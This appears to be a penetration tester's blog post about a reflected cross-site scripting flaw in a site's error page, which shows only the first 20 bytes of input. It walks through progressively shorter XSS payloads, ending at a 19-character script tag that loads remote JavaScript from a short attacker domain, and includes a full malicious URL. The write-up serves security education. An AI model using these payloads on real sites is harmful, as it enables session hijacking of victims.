---
title: "Minifying XSS"
description: How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters.
slug: minifying-xss
date: 2018-03-18T15:45:00+10:30
draft: true
categories:
- All
- Technology
- Application Security
tags:
- Penetration Testing
- Cross-Site Scripting
comments: true
ShowToc: true

cover:
  image: "hero.webp"
  alt: "A graphic of a HTML script tag fading into the background."
  relative: true
---


Cross-Site Scripting is still one of the most prevalent web application vulnerabilities, and has featured in each revision of the [OWASP Top 10](https://owasp.org/www-project-top-ten/) since the list was first published in 2010. Peaking at #2 in 2010, XSS was knocked off the podium for the first time in 2017, coming in at #7 on the list. This demotion may be due to the rise in popularity in Single Page Application (SPA) front-end frameworks such as React, Angular and Vue, which often include built-in sanitation to prevent these attacks.

However, where there is a will, there's a way.

While these frameworks do the heavy lifting to avoid these types of vulnerabilities, developers can ([and do](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0)) bypass the framework and manipulate the DOM directly, which can introduce XSS vulnerabilities. Sometimes the frameworks [get it wrong too](http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html), and people find ways to circumvent these protections. Not to mention that many applications on the web are using old frameworks or are hand-rolled and are riddled with dangerous DOM manipulation, which gets pentesters like me (and probably you) excited.

As we will see, websites can remain vulnerable to XSS attacks, even if the attack is detected. You just have to get a little crafty.

## An Ironic XSS Vulnerability

I recently came across a XSS vulnerability that got me thinking. It seemed like a run-of-the-mill [reflected XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting) vulnerability; a URL parameter was injected directly into the HTML in the page which could let a baddy make a link which they could send in a phishing email and do nasty things to the victim. Something like this:

```html
https://www.mysecuresite.com/paymentDetails.html?userid=<script>someMaliciousCode()</script>
```

The site was smart enough to recognise the attack, and rather helpfully displayed a small snippet of the code in an error page to the user. The first 20 bytes of the vulnerable URL parameter were loaded into the page, and the rest were truncated. The developers of the site must have realised that 20 bytes is far too few for any useful JavaScript, thus preventing an XSS attack. Surely…

## Wait… Bytes or Characters?

Before we go on, there's something I need to clarify which will become important later on. You may have noticed that most websites use simple characters in their URLs. Domain names are mostly letters from the Latin alphabet (such as [www.medium.com](https://www.medium.com/)), and there may be some numbers and other characters like slashes and ampersands. These characters are all from the [ASCII character set](https://www.asciitable.com/), which consists of 256 characters used commonly in English speaking countries. Originally, this is all that was supported. Somebody said "thou shall only use ASCII characters in domain names", and so we did that for a bit.

But the World Wide Web is just that, its for people of all nationalities and languages. Sure, we can fit all our Latin uppercase and lowercase letters in the ASCII character set, with a few spots left over for numbers and punctuation, but what about Hebrew? What about Arabic, or Chinese? Or variations of letters which give us piñatas and Über?

Technically, this causes a problem. You see, ASCII includes 256 characters because they can be nicely represented using a single byte, or 8 bits of 1s and 0s. But if we want to include all of these other letters and symbols, we're going to need a bigger character set, which means more bytes-per-character.

A [very](http://www.developerknowhow.com/1091/the-history-of-character-encoding), [very](https://danielmiessler.com/study/encoding/) long story short, this is where Unicode comes to the rescue. Through various iterations of the [Internationalised Domain Names](http://unicode.org/faq/idn.html) specification, we can now use a subset of the Unicode character set in our domain names! This monster of a character set includes 139 different scripts, plus a bunch of symbol sets which includes, wait for it. Emoji.

Long story short, we can use emoji and other symbols in our domain names, but we have to be wary that one character does not always equal one byte, which is important when you only have 20 bytes to play with.

## Let's Begin
So we have ourselves a challenge: can we inject malicious JavaScript in just 20 bytes? The irony of an XSS vulnerability in a page that tells the user they have been saved from an XSS attack is too much of a carrot not to chase.

### Baseline
*Length:* Unlimited

```html
<script>someMaliciousCode()</script>
```

In it's most simplest form, malicious JavaScript can be inserted into a page surrounded by <script> tags. This approach is fine where you don't have any restrictions on the size of the payload, but in our case, it's not going to cut it. A [simple keylogger](https://github.com/JohnHoder/Javascript-Keylogger/blob/master/keylogger.js) can weigh in at over 300 bytes, which is waaay over our 20 byte target. In fact, if we count the number of characters in the script tags alone, we're already at 17 bytes, giving us just three left to play with. I don't know what your JS skills are like, but I can't do a lot with three characters.

### Milestone 1: Loading a script
**Length:** 50 characters

```html
<script src='https://www.1337hacker.com/evil.js'>
```

This is a more common approach for exploiting XSS in the wild. Let's put our malicious JavaScript in a file and host it on our web server. We can then make a payload which simply loads our script and has it executed by the browser. This is nice because it lets us load effectively any JavaScript in just 50 characters. We can even build up a little library of JS payloads on our web server and reuse then in different attacks. However, in this case, we're still over our limit.

### Milestone 2: Shortening our domain
**Length:** 27 characters

```html
<script src='https://a.io'>
```

Shortening our domain name goes a long way to bringing us closer to our target. The shortest [Top-Level Domains](https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains) (TLDs), such as .io (Indian Ocean) or .uk (United Kingdom) are three characters long when you include the prefixed period. All we need to do is register a single character domain and we have the shortest possible Fully Qualified Domain Name (FQDN)!

It turns out a bunch of other people had the same idea, and it's pretty hard to get you hands on such a short domain name. More on this later 😉 But for now, let's continue building our Proof-of-Concept.

We've also removed the name of the file containing our naughty little script. We can do this by configuring our web server to host our script at the root of the web server, similar to how [www.reddit.com](http://www.reddit.com/) gives you the front page of the internet.

### Milestone 3: Inheriting the Protocol
**Length:** 21 characters

```html
<script src='//a.io'>
```

So. Close. It turns out, if we remove the 'https:' from the beginning of the URL, the browser will default to using the [same protocol](https://stackoverflow.com/questions/550038/is-it-valid-to-replace-http-with-in-a-script-src-http) that was used to load the parent page. For example, if we send out a link like this:

```html
http://www.mysecuresite.com/paymentDetails.html?userid=<script src='//a.io'>
```

The script will be loaded over HTTP since www.mysecuresite.com is being accessed over HTTP.

Now, if I'm being honest, I thought I was done here. Just one character shy of the target, and I thought I had reached the limit. A little disheartened, I contacted some friends and presented them with the challenge. Was there something I was missing that could get us below our 20 byte payload?

### Milestone 4: Removing quotation marks
**Length:** 19 characters

```html
<script src=//a.io>
```

As it turns out, there was! The quotation marks surrounding the URL are superfluous; the script loads just fine without them! And with that, we had come up with a Proof-of-Concept payload which would load arbitrary JavaScript into the user's browser and let us hijack their session. Pretty cool, huh!

### Hacking with Emoji

The PoC payload was enough to demonstrate that somebody with a short domain name could exploit the XSS vulnerability, which was enough to convince the developers to fix it. But where's the fun in that?

Remember that spiel about Internationalised Domain Names supporting Emoji? Well at this point, I jumped onto [https://i❤.ws/](https://xn--i-7iq.ws/marketplace/1?filter=1char) to see what the going rate was for a single emoji domain, and boy was I in for a surprise. A domain like [🤣.ws](https://xn--i-7iq.ws/aftermarket/xn--cq9h.ws) could set you back USD$50k! I looked in my wallet and remembered I'm not made of cash, so I settled for something a little less lucrative.

But, I can now say I'm the proud owner of ⚿.ws. The question remains, can I use this to exploit our XSS vulnerability? Sadly, no. The ⚿ character (squared key, for anybody whose browser doesn't support the emoji) is three bytes in size, which brings our payload to 21 bytes.

So close, yet so far…

---

So there it is, the shortest XSS payload I could come up with (with a little help) was 19 bytes with the right domain, or 21 bytes with my emoji domain. If you know of any other tricks to reduce the size, let me us know in the comments below!

---

**Thanks for reading!**  
If you enjoyed this post, follow on [Twitter](https://www.twitter.com/@JakobTheDev) or [Mastodon](https://infosec.exchange/@JakobTheDev) for more content. If you have any feedback or suggestions, leave it in the comments below and I'll do my best to get back to you.